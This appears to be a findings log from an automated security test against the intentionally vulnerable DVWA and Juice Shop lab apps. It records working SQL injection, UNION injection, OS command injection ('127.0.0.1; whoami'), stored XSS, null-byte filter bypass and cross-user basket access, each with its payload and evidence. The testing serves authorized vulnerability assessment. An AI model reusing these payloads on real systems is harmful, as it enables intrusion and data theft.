state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

findings.title: DVWA SQL Injection (id parameter, GET) [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 records: 'ID: 1' OR '1'='1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1' AND '1'='2 returned zero records (page shows 'User ID:' with no 'First name/Surname' rows). Surnames recorded from TRUE: admin, Brown, Me, Picasso, Smith. Differential confirms error-free boolean SQL injection in the id parameter.

findings.title: DVWA OS Command Injection (ip parameter, POST) [security=low]
request_sequence: POST http://dvwa/vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin, security=low) -> 200
findings.response_evidence: [security=low] Response contains normal ping output (4 packets transmitted, 4 received, 0% packet loss) followed directly by the injected command output line 'www-data' before 'More Information'. The web-process identity www-data is present in the response, confirming OS command execution via the ip parameter.

findings.title: Juice Shop login authentication bypass via SQL injection in email field
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user admin@juice-sh.op using an unauthenticated request with a SQL-injected email and arbitrary password, confirming login bypass. Token value redacted in this record.

findings.title: Stored XSS in guestbook message field (DVWA xss_s) [security=low]
request_sequence: GET http://dvwa/vulnerabilities/xss_s/ (dvwa_admin; security=low; form fields txtName maxlength=10, mtxMessage maxlength=50, no CSRF token)
POST http://dvwa/vulnerabilities/xss_s/ form: txtName=xssv, mtxMessage=<script id="test_token">window.xss_flag=1</script>, btnSign=Sign Guestbook (dvwa_admin)
findings.response_evidence: [security=low] Canary is exactly 50 chars, so it fits maxlength=50 with no truncation. POST returned 200 and the guestbook re-rendered with the new entry 'Name: xssv Message: ' (script body hidden from visible text, as expected for an executed/stored script tag). Fresh browser load of /vulnerabilities/xss_s/ as dvwa_admin: browser_eval_js("String(window.xss_flag)") returned "1" (result: "1"), proving the stored payload executes in the rendering page.
findings.browser_js_evidence: browser_eval_js expression 'String(window.xss_flag)' -> result: "1" on http://dvwa/vulnerabilities/xss_s/ (dvwa_admin, security=low)

findings.title: SQL injection in product search q parameter (Juice Shop /rest/products/search)
findings.response_evidence: Quote payload q=qwert': HTTP 500, body 'Error: SQLITE_ERROR: near "'%'": syntax error' (SQL error leaked). Benign baseline q=apple: HTTP 200, status:success with 2 real products (Apple Juice (1000ml) id 1, Apple Pomace id 24) with original name/description/price fields. UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200, body {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — the injected UNION columns 2..9 are reflected in the product fields, proving attacker-controlled SQL in the query. Both the SQL error and successful UNION injection are observed versus the benign baseline.

findings.title: Unauthenticated feedback listing exposes author identity info (Juice Shop /api/Feedbacks/) - email not fully disclosed
findings.response_evidence: Unauthenticated GET returned HTTP 200 application/json {"status":"success","data":[...8 records...]} with no auth required, so the endpoint is open to anonymous users. Records include UserId and comment fields. Emails appear only partially masked inside comment text: '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'. Other records show '(anonymous)' with UserId null. No full author email address and no email field is returned, so the PII (email) disclosure criterion is NOT met. Partial masking plus domain/suffix leakage is a weaker info-disclosure concern. Recommend Coordinator decide whether to treat as a low-severity finding.

findings.title: Confidential acquisitions memo exposed via open /ftp/ directory listing (unauthenticated)
findings.response_evidence:
Listing (HTTP 200, text/html) shows 'acquisitions.md 909' among files. Direct GET /ftp/acquisitions.md returned HTTP 200, text/markdown, body excerpt: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...' Confidential memo retrieved without authentication.

findings.title: Poison null-byte filter bypass on /ftp/ restricted .bak file (package.json.bak)
findings.response_evidence: Raw baseline: HTTP 403, body 'Error: Only .md and .pdf files are allowed!' (from fileServer.js). Null-byte bypass: GET /ftp/package.json.bak%2500.md returned HTTP 200, content_type application/octet-stream, body begins with '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}' i.e. the restricted package.json.bak contents. Filter bypassed via URL-encoded null byte + allowed .md extension.

findings.title: [security=high] SQL Injection via session-input.php staged id, LIMIT-bypass with trailing comment
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> user_token=[REDACTED] page showed security=low
POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302; GET http://dvwa/security.php -> 'Security level is currently: high'
findings.response_evidence: [security=high] TRUE payload (id=1' OR '1'='1' #) on /vulnerabilities/sqli/ returned 5 records with surnames: admin, Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob). FALSE payload (id=1' AND '1'='2' #) returned no records: the results block contains only 'Click here to change your ID' followed by 'More Information'. Page shows 'Security Level: high'. Session-input stored the id and echoed 'Session ID: 1' OR '1'='1' #'. Note: session_info in tool output still reported 'low' after the security change; the page body confirmed high.

findings.title: Cross-user basket access (BOLA): acct2 reads acct1's basket via /rest/basket/6
findings.response_evidence: acct1 GET /rest/basket/6 -> 200, {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","quantity":3 (BasketItem.quantity=3),"BasketId":6,"id":9}]}}. acct2 (own_basket_id=7) GET /rest/basket/6 -> 200 with identical content: basket id 6, UserId 22, product 'Apple Juice (1000ml)', BasketItem quantity 3. Account 2 retrieved Account 1's basket item with no ownership check.

findings.title: DVWA security-level form (POST /security.php) - functional verification, not a vulnerability; level changed high->low
findings.response_evidence: Before POST, the page body read 'Security level is currently: high' (tool session_info still reported low, a discrepancy). After POST security=low the 302 redirect was returned and the follow-up GET body reads 'Security level is currently: low' and 'Security level set to low', 'Security Level: low'. Level now LOW (current level for later work = low). Note: the form works with a valid user_token; this endpoint is a control to change DVWA security level, not itself a vulnerability class, so no CWE is confirmed here. Medium/high findings recorded separately remain unaffected by this check.
